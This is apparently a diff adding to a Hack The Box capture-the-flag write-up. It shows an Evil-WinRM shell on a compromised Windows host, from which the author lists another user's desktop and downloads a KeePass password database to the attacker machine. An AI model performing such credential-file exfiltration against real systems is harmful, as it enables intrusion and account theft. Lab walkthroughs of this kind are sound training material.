@@ -150,3 +150,36 @@ Mode                 LastWriteTime         Length Name
 GENESIS{L34RN_FR0M_OuR_H1ST0RY}
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> 
 ```
+There was another user Richard, lets see if they have anything interesting
+```
+*Evil-WinRM* PS C:\Users\richard\Desktop> dir
+
+
+    Directory: C:\Users\richard\Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         3/12/2021   1:18 AM           2334 passwords.kdbx
+
+
+*Evil-WinRM* PS C:\Users\richard\Desktop> download passwords.kbdx
+Info: Downloading passwords.kbdx to ./passwords.kbdx
+
+                                                             
+Info: Download successful!
+
+*Evil-WinRM* PS C:\Users\richard\Desktop> 
+```
+Download the file with Evil-WinRm
+```
+*Evil-WinRM* PS C:\> download C:\Users\richard\Desktop\passwords.kdbx /home/p3ta/HTB/genesis/passwords.kdbx
+Info: Downloading C:\Users\richard\Desktop\passwords.kdbx to /home/p3ta/HTB/genesis/passwords.kdbx
+
+                                                             
+Info: Download successful!
+```
+
+We have a user
+
+![image](https://user-images.githubusercontent.com/128841823/231904511-90757128-1d68-4014-a986-b60f0c08a1a7.png)
